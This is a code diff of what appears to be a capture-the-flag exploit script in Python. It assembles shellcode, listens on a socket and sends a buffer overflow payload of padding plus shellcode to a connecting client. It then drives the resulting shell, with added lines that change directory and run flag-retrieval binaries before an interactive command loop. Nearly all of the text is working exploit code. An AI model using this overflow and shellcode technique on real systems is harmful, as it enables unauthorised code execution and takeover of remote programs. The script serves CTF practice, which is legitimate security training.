@@ -17,7 +17,7 @@ shell = asm('''
             mov edx, 0
             int 0x80''')
 soc = socket.socket()
-port = 4444
+port = 12100
 
 soc.bind(('', port))
 soc.listen(1)
@@ -30,6 +30,11 @@ while True:
 
     con.send(b'A'*0x3c + shell)
     print('call shell')
+    con.send(b'cd home/flag\n')
+    con.send(b'./get_flag\n')
+    con.recv(1024)
+    con.send(b'./I_am_fl4g' + b'\x00\n')
+    print(con.recv(1024))
     # interactive
     while True:
         print('> ', end = '')
